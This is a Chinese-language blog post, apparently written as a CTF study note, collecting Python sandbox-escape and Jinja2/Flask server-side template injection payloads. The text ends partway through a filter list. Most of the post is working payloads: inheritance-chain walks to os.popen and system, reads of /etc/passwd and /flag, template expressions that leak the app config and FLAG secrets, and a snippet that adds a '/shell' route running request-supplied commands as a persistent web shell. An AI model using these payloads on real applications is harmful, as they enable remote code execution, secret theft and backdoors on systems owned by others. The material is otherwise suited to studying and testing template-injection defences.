<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>pyjail | cheng_xing's blog</title><meta name="author" content="cheng_xing"><meta name="copyright" content="cheng_xing"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SSTIPython继承链继承链流程通过访问Python内部属性，获取可以执行命令的库和函数。1.获取实例对象的类2.获取该类的祖先类object3.获取object的子类4.选取__init__为函数的类5.获取其__globals__属性的__builtins__6.使用内置的类执行代码或导包后执行命令 Python内部属性： 12345678910__class__ 返回一个实例所属的类__">
<meta property="og:type" content="article">
<meta property="og:title" content="pyjail">
<meta property="og:url" content="https://sakuraraindrop.github.io/2025/04/06/pyjail/index.html">
<meta property="og:site_name" content="cheng_xing&#39;s blog">
<meta property="og:description" content="SSTIPython继承链继承链流程通过访问Python内部属性，获取可以执行命令的库和函数。1.获取实例对象的类2.获取该类的祖先类object3.获取object的子类4.选取__init__为函数的类5.获取其__globals__属性的__builtins__6.使用内置的类执行代码或导包后执行命令 Python内部属性： 12345678910__class__ 返回一个实例所属的类__">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://sakuraraindrop.github.io/img/ltx.jpg">
<meta property="article:published_time" content="2025-04-05T17:19:09.000Z">
<meta property="article:modified_time" content="2025-04-13T06:44:11.614Z">
<meta property="article:author" content="cheng_xing">
<meta property="article:tag" content="pyjail">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sakuraraindrop.github.io/img/ltx.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "pyjail",
  "url": "https://sakuraraindrop.github.io/2025/04/06/pyjail/",
  "image": "https://sakuraraindrop.github.io/img/ltx.jpg",
  "datePublished": "2025-04-05T17:19:09.000Z",
  "dateModified": "2025-04-13T06:44:11.614Z",
  "author": [
    {
      "@type": "Person",
      "name": "cheng_xing",
      "url": "https://sakuraraindrop.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/ltx-icon.jpg"><link rel="canonical" href="https://sakuraraindrop.github.io/2025/04/06/pyjail/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'pyjail',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/hk.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">103</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/hk.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ltx-icon.jpg" alt="Logo"><span class="site-name">cheng_xing's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">pyjail</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">pyjail</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-05T17:19:09.000Z" title="发表于 2025-04-06 01:19:09">2025-04-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-13T06:44:11.614Z" title="更新于 2025-04-13 14:44:11">2025-04-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%9F%BA%E7%A1%80/">web基础</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h2 id="Python继承链"><a href="#Python继承链" class="headerlink" title="Python继承链"></a>Python继承链</h2><h3 id="继承链流程"><a href="#继承链流程" class="headerlink" title="继承链流程"></a>继承链流程</h3><p>通过访问Python内部属性，获取可以执行命令的库和函数。<br>1.获取实例对象的类<br>2.获取该类的祖先类object<br>3.获取object的子类<br>4.选取__init__为函数的类<br>5.获取其__globals__属性的__builtins__<br>6.使用内置的类执行代码或导包后执行命令</p>
<p>Python内部属性：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__class__ 返回一个实例所属的类</span><br><span class="line">__mro__ 查看类继承的所有父类，直到object</span><br><span class="line">__subclasses__() 获取一个类的子类，返回的是一个列表</span><br><span class="line">__bases__ 返回一个类直接所继承的类（元组形式）</span><br><span class="line">__init__ 类实例创建之后调用, 对当前对象的实例的一些初始化</span><br><span class="line">__globals__  使用方式是 函数名.__globals__，返回一个当前空间下能使用的模块，方法和变量的字典，与func_globals等价</span><br><span class="line">__getattribute__ 当类被调用的时候，无条件进入此函数。</span><br><span class="line">__getattr__ 对象中不存在的属性时调用</span><br><span class="line">__dict__ 返回所有属性，包括属性，方法等</span><br><span class="line">__builtins__ 方法是作为默认初始模块出现的，可用于查看当前所有导入的内建函数</span><br></pre></td></tr></table></figure>

<h4 id="获取object类"><a href="#获取object类" class="headerlink" title="获取object类"></a>获取object类</h4><p>python的object类是所有类的基类，可以通过__mro__和__bases__两种方式来访问到object。<br>__mro__属性获取类的MRO(方法解析顺序)，也就是继承关系。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__mro__[1]</span><br><span class="line">[].__class__.__mro__[1]</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[1]#python3</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2]#python2</span><br><span class="line">request.__class__.__mro__[8] #针对jinjia2/flask为[9]适用</span><br></pre></td></tr></table></figure>
<p>__base__属性可以获取该类的基类，可以叠加使用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line">[].__class__.__base__</span><br><span class="line">&#x27;&#x27;.__class__.__base__ # python3</span><br><span class="line">&#x27;&#x27;.__class__.__base__.__base__ # python2</span><br></pre></td></tr></table></figure>
<p>__bases__属性可以获取多继承的基类元组。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">&#x27;&#x27;.__class__.__bases__[0] # python3</span><br></pre></td></tr></table></figure>

<h4 id="获取子类列表"><a href="#获取子类列表" class="headerlink" title="获取子类列表"></a>获取子类列表</h4><p>然后通过object类的__subclasses__()方法获取所有的子类列表，查看可用的类。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()</span><br></pre></td></tr></table></figure>
<p>找到__init__为函数的类。<br>在获取初始化属性后，寻找不带warpper的，wrapper是指这些函数并没有被重载，不具有__globals__属性。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l=len([].__class__.__mro__[1].__subclasses__())</span><br><span class="line">for i in range(l):</span><br><span class="line">	if &#x27;wrapper&#x27; not in str([].__class__.__mro__[1].__subclasses__()[i].__init__):</span><br><span class="line">		print(i,[].__class__.__mro__[1].__subclasses__()[i])</span><br></pre></td></tr></table></figure>
<p>或者使用func_globals</p>
<p>存在的子模块还可以通过.index()来进行查询，如果存在的话返回索引，直接调用即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[2].__subclasses__().index(file)</span><br><span class="line">40</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read() </span><br><span class="line">#将read() 修改为 write() 即为写文件</span><br></pre></td></tr></table></figure>

<h4 id="查看其引用-builtins"><a href="#查看其引用-builtins" class="headerlink" title="查看其引用__builtins__"></a>查看其引用__builtins__</h4><p>builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;]</span><br></pre></td></tr></table></figure>
<p>这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file以实现读取文件的功能：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&#x27;/etc/passwd&#x27;).read()</span><br></pre></td></tr></table></figure>

<h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><p>常见的三种利用方式<br>__builtins__</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)</span><br><span class="line">[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()</span><br><span class="line">[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;platform&#x27;).popen(&#x27;whoami&#x27;).read()</span><br></pre></td></tr></table></figure>

<p>linecache</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)</span><br><span class="line">[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;sys&#x27;].modules[&#x27;os&#x27;].system(&#x27;whoami&#x27;)</span><br><span class="line">[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>

<p>sys</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__[&#x27;sys&#x27;].modules[&#x27;os&#x27;].system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>

<p>利用eval进行命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;)</span><br></pre></td></tr></table></figure>

<p>利用warnings.catch_warnings 进行命令执行<br>(1)查看warnings.catch_warnings方法的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)</span><br><span class="line">59</span><br></pre></td></tr></table></figure>
<p>(2)查看linecatch的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index(&#x27;linecache&#x27;)</span><br><span class="line">25</span><br></pre></td></tr></table></figure>
<p>(3)查找os模块的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.keys().index(&#x27;os&#x27;)</span><br><span class="line">12</span><br></pre></td></tr></table></figure>
<p>(4)查找system方法的位置（在这里使用os.open().read()可以实现一样的效果,步骤一样,不再复述）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.values()[12].__dict__.keys().index(&#x27;system&#x27;)</span><br><span class="line">144</span><br></pre></td></tr></table></figure>
<p>(5)调用system方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.values()[12].__dict__.values()[144](&#x27;whoami&#x27;)</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>(6)直接搜索</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == &#x27;catch_warnings&#x27;][0]()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()</span><br></pre></td></tr></table></figure>

<p>利用commands 进行命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;commands&#x27;).getstatusoutput(&#x27;ls&#x27;)</span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;ls&#x27;)</span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用任意字符串或特殊变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sss.__init__.__globals__.__builtins__.open(&quot;/flag&quot;).read()</span><br><span class="line">config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()</span><br><span class="line">request.application.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()</span><br></pre></td></tr></table></figure>

<h4 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h4><p>泄漏环境变量等配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;self.__dict__&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#x27;json&#x27;].JSONEncoder.default.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;</span><br><span class="line">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;</span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125;</span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/flag&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>查看全局变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[变量名].__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>jinja环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__init__.__globals__.app.jinja_env&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>常用函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line">__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span><br><span class="line">__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.</span><br><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的模块、方法以及所有变量。查看所有键名：__globals__.keys()。</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。</span><br><span class="line">__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()</span><br><span class="line">request.args.x1   	 get传参</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 post传参	(Content-Type:a/b)</span><br><span class="line">request.json		 post传json  (Content-Type: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line"></span><br><span class="line">cycler               &#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;id&#x27;).read()&#125;&#125;</span><br><span class="line">joiner               &#123;&#123;joiner.__init__.__globals__.os.popen(&#x27;id&#x27;).read()&#125;&#125;</span><br><span class="line">namespace            &#123;&#123;namespace.__init__.__globals__.os.popen(&#x27;id&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">写路由：</span><br><span class="line">app=__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]</span><br><span class="line">app.route(&quot;/shell&quot;,&quot;GET&quot;,lambda :__import__(&#x27;os&#x27;).popen(request.params.ge</span><br><span class="line">t(&#x27;cmd&#x27;)).read())</span><br></pre></td></tr></table></figure>

<p>常用过滤器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">int()：将值转换为int类型；</span><br><span class="line">float()：将值转换为float类型；</span><br><span class="line">lower()：将字符串转换为小写；</span><br><span class="line">upper()：将字符串转换为大写；</span><br><span class="line">title()：把值中的每个单词的首字母都转成大写；</span><br><span class="line">capitalize()：把变量值的首字母转成大写，其余字母转小写；</span><br><span class="line">trim()：截取字符串前面和后面的空白字符；</span><br><span class="line">wordcount()：计算一个长字符串中单词的个数；</span><br><span class="line">reverse()：字符串反转；</span><br><span class="line">replace(value,old,new)： 替换将old替换为new的字符串；</span><br><span class="line">truncate(value,length=255,killwords=False)：截取length长度的字符串；</span><br><span class="line">striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；</span><br><span class="line">escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。</span><br><span class="line">safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： 